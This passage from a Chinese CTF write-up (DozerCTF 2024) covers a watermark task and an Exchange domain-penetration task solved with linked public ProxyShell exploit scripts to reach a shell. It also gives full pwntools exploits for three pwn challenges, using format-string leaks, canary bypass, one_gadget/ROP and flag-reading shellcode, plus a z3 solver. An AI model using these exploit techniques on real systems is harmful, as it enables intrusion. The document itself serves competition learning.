title="shuiyin"></a>shuiyin</h2><p>嘿嘿，出题人总是不仔细啊，直接给flag也没下，那我接着面向答案的wp了。</p><p>按道理应该是最右边的图片，猜测是盲水印，拖到软件里面解一下就行了吧，然后可以得到flag,(估计本来就简单，上的太匆忙了)</p><h2 id="问卷"><a href="#问卷" class="headerlink" title="问卷"></a>问卷</h2><p>正常答题就行，最后想抢手速也是于事无补。</p><p>以下部分由队友完成我只是负责拼装。</p><h2 id="简单的域渗透III-flag1"><a href="#简单的域渗透III-flag1" class="headerlink" title="简单的域渗透III-flag1"></a>简单的域渗透III-flag1</h2><p>发现被重定向</p><p><img src="/../../images/dozerctf2024/flag1.png" alt="flag1"></p><p>根据题目发现是exchange+office365</p><p><img src="/../../images/dozerctf2024/flag3.png" alt="flag3"></p><p>查阅文章<a href="https://mp.weixin.qq.com/s/O6a40449vTKWUXS4kwD9xA">记一次曲折的exchange漏洞利用-ProxyMaybeShell (qq.com)</a></p><p>proxyshell一梭拿到token</p><p>脚本代码：</p><p><a href="https://github.com/dmaasland/proxyshell-poc">https://github.com/dmaasland/proxyshell-poc</a></p><p><img src="/../../images/dozerctf2024/flag4.png" alt="flag4"></p><p>从github上撸到<a href="https://github.com/FDlucifer/Proxy-Attackchain/blob/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/proxymaybeshell/ProxyMaybeShell-main/proxynotshellfileWrite.py#L3%E7%9B%B4%E6%8E%A5%E4%B8%80%E6%8A%8A%E6%A2%AD">https://github.com/FDlucifer/Proxy-Attackchain/blob/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/proxymaybeshell/ProxyMaybeShell-main/proxynotshellfileWrite.py#L3直接一把梭</a></p><p><img src="/../../images/dozerctf2024/flag5.png" alt="flag5"></p><p><img src="/../../images/dozerctf2024/flag6.png" alt="flag6"></p><p>拿到shell</p><p>群里桌面和vpn两hint，找到如下</p><p><img src="/../../images/dozerctf2024/flag7.png" alt="flag7"></p><p>tar解压取出password</p><p><img src="/../../images/dozerctf2024/flag8.png" alt="flag8"></p><p><img src="/../../images/dozerctf2024/flag9.png" alt="flag9"></p><p>flag{b5c1cd1c-45d8-4c5e-bf2e-d2b87419248f}</p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="一个不对劲的溢出"><a href="#一个不对劲的溢出" class="headerlink" title="一个不对劲的溢出"></a>一个不对劲的溢出</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&#x27;139.196.237.232&#x27;</span>,<span class="hljs-number">32916</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>payload = <span class="hljs-string">&#x27;aa%37$pbb%36$pcc%35$p&#x27;</span><br>p.sendlineafter(<span class="hljs-string">&#x27;username?\n&#x27;</span>,payload)<br>p.recvuntil(<span class="hljs-string">&#x27;aa&#x27;</span>)<br>libc_base = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>)-<span class="hljs-number">231</span>-libc.symbols[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;libc_base--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br>p.recvuntil(<span class="hljs-string">&#x27;bb&#x27;</span>)<br>pie = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>)-<span class="hljs-number">0x0000A20</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;pie--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(pie))<br>p.recvuntil(<span class="hljs-string">&#x27;cc&#x27;</span>)<br>canary = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">18</span>),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;canary--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(canary))<br>pop_rdi = <span class="hljs-number">0x00a83</span>+pie<br>system = libc_base+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh = libc_base+<span class="hljs-number">0x001b3d88</span><br>ret = <span class="hljs-number">0x000A84</span><br>main = pie+<span class="hljs-number">0x0007F0</span><br>og = [<span class="hljs-number">0x4f2be</span>,<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]<br>og_yuan = [<span class="hljs-number">0x4f29e</span>,<span class="hljs-number">0x4f2a5</span>,<span class="hljs-number">0x4f302</span>,<span class="hljs-number">0x10a2fc</span>]<br>shell = libc_base+og_yuan[<span class="hljs-number">0</span>]<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0xd0</span>-<span class="hljs-number">0x8</span>)+p64(canary)+<span class="hljs-string">b&#x27;bbbbbbbb&#x27;</span><br><span class="hljs-comment">#payload+= p64(pop_rdi)+p64(binsh)+p64(ret)+p64(system)</span><br>payload+= p64(shell)<br>p.send(payload)<br>p.sendline(<span class="hljs-string">&#x27;exec 1&gt;&amp;0&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="mid-pwn"><a href="#mid-pwn" class="headerlink" title="mid_pwn"></a>mid_pwn</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><br>p = remote(<span class="hljs-string">&#x27;139.196.237.232&#x27;</span>,<span class="hljs-number">32972</span>)<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>shellcode = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov rdi, 0x67616c66</span><br><span class="hljs-string">push rdi</span><br><span class="hljs-string">xor rdi, rdi</span><br><span class="hljs-string">sub rdi, 100</span><br><span class="hljs-string">mov rsi, rsp</span><br><span class="hljs-string">xor rdx, rdx</span><br><span class="hljs-string">xor r10, r10</span><br><span class="hljs-string">mov rax, SYS_openat</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">push 3</span><br><span class="hljs-string">pop rdi</span><br><span class="hljs-string">push 0x1</span><br><span class="hljs-string">pop rdx</span><br><span class="hljs-string">push 0x100</span><br><span class="hljs-string">lea rbx, [rsp-8]</span><br><span class="hljs-string">push rbx</span><br><span class="hljs-string">mov rsi, rsp</span><br><span class="hljs-string">push SYS_readv</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">push 1</span><br><span class="hljs-string">pop rdi</span><br><span class="hljs-string">push 0x1</span><br><span class="hljs-string">pop rdx</span><br><span class="hljs-string">push 0x100</span><br><span class="hljs-string">lea rbx, [rsp+8]</span><br><span class="hljs-string">push rbx</span><br><span class="hljs-string">mov rsi, rsp</span><br><span class="hljs-string">push SYS_writev</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>shellcode = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">231</span>+asm(shellcode)<br>p.sendlineafter(<span class="hljs-string">b&#x27;show me\n&#x27;</span>,shellcode)<br>p.recv()<br></code></pre></td></tr></table></figure><h2 id="ezpwn"><a href="#ezpwn" class="headerlink" title="ezpwn"></a>ezpwn</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br> <br>p = remote(<span class="hljs-string">&#x27;139.196.237.232&#x27;</span>,<span class="hljs-number">32944</span>)<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc = cdll.LoadLibrary(<span class="hljs-string">&#x27;libc.so.6&#x27;</span>)<br>glibc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br>seed = libc.time(<span class="hljs-number">0</span>)<br>password = libc.rand(libc.srand(seed))<br>p.sendafter(<span class="hljs-string">&#x27;account:&#x27;</span>,<span class="hljs-string">&#x27;xiaochange&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;password:&#x27;</span>,<span class="hljs-built_in">str</span>(password))<br>pop_rdi = <span class="hljs-number">0x004014d3</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>+<span class="hljs-string">b&#x27;bbbbbbbb&#x27;</span><br>payload+= p64(pop_rdi)+p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>])+p64(elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>payload+= p64(<span class="hljs-number">0x000401423</span>)<br>p.sendafter(<span class="hljs-string">&#x27;something\n&#x27;</span>,payload)<br>p.recvuntil(<span class="hljs-string">&#x27;bye~~\n&#x27;</span>)<br>libc_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))-glibc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>og = [<span class="hljs-number">0xe3afe</span>,<span class="hljs-number">0xe3b01</span>,<span class="hljs-number">0xe3b04</span>]<br>seed = libc.time(<span class="hljs-number">0</span>)<br>password = libc.rand(libc.srand(seed))<br>shell = libc_addr+og[<span class="hljs-number">1</span>]<br>p.sendafter(<span class="hljs-string">&#x27;account:&#x27;</span>,<span class="hljs-string">&#x27;xiaochange&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;password:&#x27;</span>,<span class="hljs-built_in">str</span>(password))<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>+<span class="hljs-string">b&#x27;bbbbbbbb&#x27;</span><br>payload+= p64(shell)<br>p.sendafter(<span class="hljs-string">&#x27;something\n&#x27;</span>,payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="pppyyy"><a href="#pppyyy" class="headerlink" title="pppyyy"></a>pppyyy</h2><p>将pyc反编译，解方程组</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *  <br><br><span class="hljs-comment"># 创建 14 个未知数  </span><br>nums = [Real(<span class="hljs-string">&#x27;nums%d&#x27;</span> % i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">14</span>)]  <br><br>eqns = [  <br>(((((nums[<span class="hljs-number">0</span>] * <span class="hljs-number">2</span> + nums[<span class="hljs-number">1</span>] - <span class="hljs-number">4</span> - nums[<span class="hljs-number">2</span>] * <span class="hljs-number">3</span> - nums[<span class="hljs-number">3</span>] - <span class="hljs-number">3</span>) + nums[<span class="hljs-number">4</span>] * <span class="hljs-number">5</span> + nums[<span class="hljs-number">5</span>] * <span class="hljs-number">5</span> - nums[<span class="hljs-number">6</span>] - <span class="hljs-number">3</span>) + nums[<span class="hljs-number">7</span>] + <span class="hljs-number">2</span> - nums[<span class="hljs-number">8</span>]) + <span class="hljs-number">3</span> + nums[<span class="hljs-number">9</span>] - <span class="hljs-number">3</span> - nums[<span class="hljs-number">10</span>] * <span class="hljs-number">4</span>) + nums[<span class="hljs-number">11</span>] * <span class="hljs-number">3</span> - nums[<span class="hljs-number">12</span>] - <span class="hljs-number">2</span>) + nums[<span class="hljs-number">13</span>] + <span class="hljs-number">3</span> == <span class="hljs-number">56</span>,<br>((((nums[<span class="hljs-number">0</span>] + <span class="hljs-number">2</span> - nums[<span class="hljs-number">1</span>] * <span class="hljs-number">5</span>) + nums[<span class="hljs-number">2</span>] - <span class="hljs-number">3</span> - nums[<span class="hljs-number">3</span>]) + <span class="hljs-number">5</span> - nums[<span class="hljs-number">4</span>] * <span class="hljs-number">4</span> - nums[<span class="hljs-number">5</span>]) + <span class="hljs-number">5</span> + nums[<span class="hljs-number">6</span>] * <span class="hljs-number">4</span> + nums[<span class="hljs-number">7</span>] * <span class="hljs-number">5</span> + nums[<span class="hljs-number">8</span>] * <span class="hljs-number">3</span> + nums[<span class="hljs-number">9</span>] * <span class="hljs-number">5</span> - nums[<span class="hljs-number">10</span>] - <span class="hljs-number">5</span> - nums[<span class="hljs-number">11</span>] - <span class="hljs-number">2</span> - nums[<span class="hljs-number">12</span>] - <span class="hljs-number">5</span>) + nums[<span class="hljs-number">13</span>] - <span class="hljs-number">3</span> == <span class="hljs-number">681</span>,<br>(((nums[<span class="hljs-number">0</span>] * <span class="hljs-number">5</span> + nums[<span class="hljs-number">1</span>] * <span class="hljs-number">3</span> - nums[<span class="hljs-number">2</span>] - <span class="hljs-number">2</span>) + nums[<span class="hljs-number">3</span>] * <span class="hljs-number">4</span> + nums[<span class="hljs-number">4</span>] - <span class="hljs-number">3</span>) + nums[<span class="hljs-number">5</span>] * <span class="hljs-number">4</span> + nums[<span class="hljs-number">6</span>] * <span class="hljs-number">4</span> + nums[<span class="hljs-number">7</span>] + <span class="hljs-number">3</span> - nums[<span class="hljs-number">8</span>] * <span class="hljs-number">2</span> - nums[<span class="hljs-number">9</span>]) + <span class="hljs-number">3</span> + nums[<span class="hljs-number">10</span>] + <span class="hljs-number">3</span> - nums[<span class="hljs-number">11</span>] * <span class="hljs-number">2</span> - nums[<span class="hljs-number">12</span>] * <span class="hljs-number">3</span> - nums[<span class="hljs-number">13</span>] * <span class="hljs-number">2</span> == <span class="hljs-number">1129</span>,<br>(((((nums[<span class="hljs-number">0</span>] * <span class="hljs-number">5</span> - nums[<span class="hljs-number">1</span>] - <span class="hljs-number">2</span>) + nums[<span class="hljs-number">2</span>] - <span class="hljs-number">2</span>) + nums[<span class="hljs-number">3</span>] + <span class="hljs-number">5</span> - nums[<span class="hljs-number">4</span>]) + <span class="hljs-number">3</span> + nums[<span class="hljs-number">5</span>] * <span class="hljs-number">2</span> + nums[<span class="hljs-number">6</span>] + <span class="hljs-number">2</span> - nums[<span class="hljs-number">7</span>] * <span class="hljs-number">4</span> - nums[<span class="hljs-number">8</span>] - <span class="hljs-number">2</span>) + nums[<span class="hljs-number">9</span>] + <span class="hljs-number">5</span> + nums[<span class="hljs-number">10</span>] + <span class="hljs-number">4</span> - nums[<span class="hljs-number">11</span>]) + <span class="hljs-number">3</span> + nums[<span class="hljs-number">12</span>] + <span class="hljs-number">3</span> - nums[<span class="hljs-number">13</span>] * <span class="hljs-number">5</span> == <span class="hljs-number">55</span>,<br>((((nums[<span class="hljs-number">0</span>] + <span class="hljs-number">2</span> - nums[<span class="hljs-number">1</span>] * <span class="hljs-number">4</span> - nums[<span class="hljs-number">2</span>] * <span class="hljs-number">3</span>) + nums[<span class="hljs-number">3</span>] + <span class="hljs-number">3</span> + nums[<span class="hljs-number">4</span>] * <span class="hljs-number">4</span> + nums[<span class="hljs-number">5</span>] * <span class="hljs-number">3</span> - nums[<span class="hljs-number">6</span>]) + <span class="hljs-number">5</span> + nums[<span class="hljs-number">7</span>] - <span class="hljs-number">2</span> - nums[<span class="hljs-number">8</span>]) + <span class="hljs-number">5</span> + nums[<span class="hljs-number">9</span>] * <span class="hljs-number">4</span> - nums[<span class="hljs-number">10</span>] - <span class="hljs-number">2</span> - nums[<span class="hljs-number">11</span>] - <span class="hljs-number">4</span>) + nums[<span class="hljs-number">12</span>] * <span class="hljs-number">5</span> - nums[<span class="hljs-number">13</span>] - <span class="hljs-number">4</span> == <span class="hljs-number">673</span>,<br>(((((nums[<span class="hljs-number">0</span>] - <span class="hljs-number">5</span> - nums[<span class="hljs-number">1</span>] - <span class="hljs-number">4</span> - nums[<span class="hljs-number">2</span>] - <span class="hljs-number">4</span> - nums[<span class="hljs-number">3</span>]) + <span class="hljs-number">2</span> + nums[<span class="hljs-number">4</span>] * <span class="hljs-number">4</span> - nums[<span class="hljs-number">5</span>]) + <span class="hljs-number">4</span> + nums[<span class="hljs-number">6</span>] + <span class="hljs-number">3</span> + nums[<span class="hljs-number">7</span>] + <span class="hljs-number">5</span> - nums[<span class="hljs-number">8</span>] * <span class="hljs-number">5</span> - nums[<span class="hljs-number">9</span>]) + <span class="hljs-number">2</span> + nums[<span class="hljs-number">10</span>] + <span class="hljs-number">2</span> + nums[<span class="hljs-number">11</span>] - <span class="hljs-number">2</span>) + nums[<span class="hljs-number">12</span>] * <span class="hljs-number">3</span> - nums[<span class="hljs-number">13</span>]) + <span class="hljs-number">4</span> == <span class="hljs-number">249</span>,<br>((((((nums[<span class="hljs-number">0</span>] * <span class="hljs-number">4</span> + nums[<span class="hljs-number">1</span>] - <span class="hljs-number">4</span>) + nums[<span class="hljs-number">2</span>] - <span class="hljs-number">5</span>) + nums[<span class="hljs-number">3</span>] - <span class="hljs-number">2</span> - nums[<span class="hljs-number">4</span>] * <span class="hljs-number">2</span>) + nums[<span class="hljs-number">5</span>] + <span class="hljs-number">3</span> + nums[<span class="hljs-number">6</span>] - <span class="hljs-number">3</span> - nums[<span class="hljs-number">7</span>]) + <span class="hljs-number">3</span> - nums[<span class="hljs-number">8</span>] * <span class="hljs-number">4</span> - nums[<span class="hljs-number">9</span>] * <span class="hljs-number">3</span>) + nums[<span class="hljs-number">10</span>] * <span class="hljs-number">2</span> + nums[<span class="hljs-number">11</span>] * <span class="hljs-number">5</span> + nums[<span class="hljs-number">12</span>] - <span class="hljs-number">4</span>) + nums[<span class="hljs-number">13</span>] - <span class="hljs-number">4</span> == <span class="hljs-number">422</span>,<br>((((((nums[<span class="hljs-number">0</span>] * <span class="hljs-number">3</span> - nums[<span class="hljs-number">1</span>] - <span class="hljs-number">3</span> - nums[<span class="hljs-number">2</span>] - <span class="hljs-number">3</span>) + nums[<span class="hljs-number">3</span>] - <span class="hljs-number">2</span> - nums[<span class="hljs-number">4</span>] - <span class="hljs-number">5</span>) + nums[<span class="hljs-number">5</span>] * <span class="hljs-number">2</span> + nums[<span class="hljs-number">6</span>] - <span class="hljs-number">4</span>) + nums[<span class="hljs-number">7</span>] - <span class="hljs-number">5</span>) + nums[<span class="hljs-number">8</span>] * <span class="hljs-number">5</span> - nums[<span class="hljs-number">9</span>] * <span class="hljs-number">3</span> - nums[<span class="hljs-number">10</span>]) + <span class="hljs-number">5</span> - nums[<span class="hljs-number">11</span>] - <span class="hljs-number">4</span> - nums[<span class="hljs-number">12</span>] * <span class="hljs-number">5</span>) + nums[<span class="hljs-number">13</span>] - <span class="hljs-number">4</span> == <span class="hljs-number">49</span>,<br>(((((((nums[<span class="hljs-number">0</span>] - <span class="hljs-number">4</span> - nums[<span class="hljs-number">1</span>]) + <span class="hljs-number">3</span> - nums[<span class="hljs-number">2</span>]) + <span class="hljs-number">4</span> - nums[<span class="hljs-number">3</span>] - <span class="hljs-number">4</span>) + nums[<span class="hljs-number">4</span>] + <span class="hljs-number">5</span> - nums[<span class="hljs-number">5</span>] * <span class="hljs-number">3</span>) + nums[<span class="hljs-number">6</span>] + <span class="hljs-number">2</span> + nums[<span class="hljs-number">7</span>] * <span class="hljs-number">4</span> - nums[<span class="hljs-number">8</span>] - <span class="hljs-number">4</span> - nums[<span class="hljs-number">9</span>]) + <span class="hljs-number">3</span> - nums[<span class="hljs-number">10</span>] * <span class="hljs-number">5</span>) + nums[<span class="hljs-number">11</span>] * <span class="hljs-number">2</span> + nums[<span class="hljs-number">12</span>] * <span class="hljs-number">3</span> - nums[<span class="hljs-number">13</span>]) + <span class="hljs-number">2</span> == <span class="hljs-number">0</span>,<br>(((((((nums[<span class="hljs-number">0</span>] - <span class="hljs-number">5</span> - nums[<span class="hljs-number">1</span>]) + <span class="hljs-number">5</span> - nums[<span class="hljs-number">2</span>] - <span class="hljs-number">4</span>) + nums[<span class="hljs-number">3</span>] + <span class="hljs-number">3</span> + nums[<span class="hljs-number">4</span>] - <span class="hljs-number">2</span>) + nums[<span class="hljs-number">5</span>] - <span class="hljs-number">4</span>) + nums[<span class="hljs-number">6</span>] * <span class="hljs-number">2</span> - nums[<span class="hljs-number">7</span>] - <span class="hljs-number">4</span> - nums[<span class="hljs-number">8</span>] * <span class="hljs-number">4</span>) + nums[<span class="hljs-number">9</span>] + <span class="hljs-number">4</span> + nums[<span class="hljs-number">10</span>] * <span class="hljs-number">4</span> - nums[<span class="hljs-number">11</span>]) + <span class="hljs-number">5</span> - nums[<span class="hljs-number">12</span>]) + <span class="hljs-number">4</span> + nums[<span class="hljs-number">13</span>] + <span class="hljs-number">4</span> == <span class="hljs-number">268</span>,<br>((((((nums[<span class="hljs-number">0</span>] - <span class="hljs-number">5</span> - nums[<span class="hljs-number">1</span>]) + <span class="hljs-number">3</span> - nums[<span class="hljs-number">2</span>]) + <span class="hljs-number">2</span> + nums[<span class="hljs-number">3</span>] - <span class="hljs-number">4</span> - nums[<span class="hljs-number">4</span>]) + <span class="hljs-number">4</span> + nums[<span class="hljs-number">5</span>] - <span class="hljs-number">5</span> - nums[<span class="hljs-number">6</span>]) + <span class="hljs-number">2</span> + nums[<span class="hljs-number">7</span>] - <span class="hljs-number">4</span> - nums[<span class="hljs-number">8</span>] - <span class="hljs-number">5</span> - nums[<span class="hljs-number">9</span>] - <span class="hljs-number">5</span> - nums[<span class="hljs-number">10</span>] - <span class="hljs-number">2</span> - nums[<span class="hljs-number">11</span>]) + <span class="hljs-number">5</span> + nums[<span class="hljs-number">12</span>] - <span class="hljs-number">3</span>) + nums[<span class="hljs-number">13</span>] + <span class="hljs-number">4</span> == -<span class="hljs-number">162</span>,<br>((((((((nums[<span class="hljs-number">0</span>] + <span class="hljs-number">5</span> - nums[<span class="hljs-number">1</span>]) + <span class="hljs-number">4</span> + nums[<span class="hljs-number">2</span>] * <span class="hljs-number">5</span> - nums[<span class="hljs-number">3</span>] - <span class="hljs-number">3</span>) + nums[<span class="hljs-number">4</span>] - <span class="hljs-number">5</span> - nums[<span class="hljs-number">5</span>] - <span class="hljs-number">5</span>) + nums[<span class="hljs-number">6</span>] + <span class="hljs-number">3</span> - nums[<span class="hljs-number">7</span>] * <span class="hljs-number">5</span> - nums[<span class="hljs-number">8</span>] * <span class="hljs-number">3</span>) + nums[<span class="hljs-number">9</span>] - <span class="hljs-number">4</span>) + nums[<span class="hljs-number">10</span>] - <span class="hljs-number">2</span>) + nums[<span class="hljs-number">11</span>] - <span class="hljs-number">3</span>) + nums[<span class="hljs-number">12</span>] - <span class="hljs-number">5</span>) + nums[<span class="hljs-number">13</span>] + <span class="hljs-number">2</span> == -<span class="hljs-number">2</span>,<br>((((nums[<span class="hljs-number">0</span>] + <span class="hljs-number">4</span> + nums[<span class="hljs-number">1</span>] - <span class="hljs-number">5</span> - nums[<span class="hljs-number">2</span>]) + <span class="hljs-number">3</span> + nums[<span class="hljs-number">3</span>] + <span class="hljs-number">3</span> - nums[<span class="hljs-number">4</span>] - <span class="hljs-number">4</span> - nums[<span class="hljs-number">5</span>]) + <span class="hljs-number">3</span> + nums[<span class="hljs-number">6</span>] - <span class="hljs-number">3</span> - nums[<span class="hljs-number">7</span>] - <span class="hljs-number">5</span> - nums[<span class="hljs-number">8</span>]) + <span class="hljs-number">3</span> + nums[<span class="hljs-number">9</span>] - <span class="hljs-number">5</span> - nums[<span class="hljs-number">10</span>] - <span class="hljs-number">2</span>) + nums[<span class="hljs-number">11</span>] + <span class="hljs-number">5</span> + nums[<span class="hljs-number">12</span>] * <span class="hljs-number">5</span> - nums[<span class="hljs-number">13</span>] - <span class="hljs-number">5</span> == <span class="hljs-number">433</span>,<br>(((((nums[<span class="hljs-number">0</span>] + <span class="hljs-number">4</span> + nums[<span class="hljs-number">1</span>] + <span class="hljs-number">4</span> + nums[<span class="hljs-number">2</span>] + <span class="hljs-number">3</span> - nums[<span class="hljs-number">3</span>] - <span class="hljs-number">2</span>) + nums[<span class="hljs-number">4</span>] - <span class="hljs-number">4</span>) + nums[<span class="hljs-number">5</span>] + <span class="hljs-number">3</span> - nums[<span class="hljs-number">6</span>] - <span class="hljs-number">4</span> - nums[<span class="hljs-number">7</span>] * <span class="hljs-number">2</span>) + nums[<span class="hljs-number">8</span>] - <span class="hljs-number">3</span>) + nums[<span class="hljs-number">9</span>] + <span class="hljs-number">2</span> + nums[<span class="hljs-number">10</span>] * <span class="hljs-number">3</span> - nums[<span class="hljs-number">11</span>] * <span class="hljs-number">4</span>) + nums[<span class="hljs-number">12</span>] + <span class="hljs-number">5</span> + nums[<span class="hljs-number">13</span>] * <span class="hljs-number">3</span> == <span class="hljs-number">515</span>,<br>]  <br>  <br><span class="hljs-comment"># 创建一个求解器对象  </span><br>s = Solver()  <br>  <br><span class="hljs-comment"># 将方程添加到求解器中  </span><br>s.add(eqns)  <br>  <br><span class="hljs-comment"># 检查是否有解  </span><br><span class="hljs-keyword">if</span> s.check() == sat:  <br>    <span class="hljs-comment"># 获取解  </span><br>    m = s.model()  <br>    <span class="hljs-comment"># 打印解  </span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">14</span>):  <br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;nums<span class="hljs-subst">&#123;i&#125;</span> = <span class="hljs-subst">&#123;m[nums[i]]&#125;</span>&quot;</span>)  <br><span class="hljs-keyword">else</span>:  <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;方程组无解&quot;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">14</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">str</span>(m[nums[i]]))),end=<span class="hljs-string">&#x27;&#x27;</span>)<br><br><span 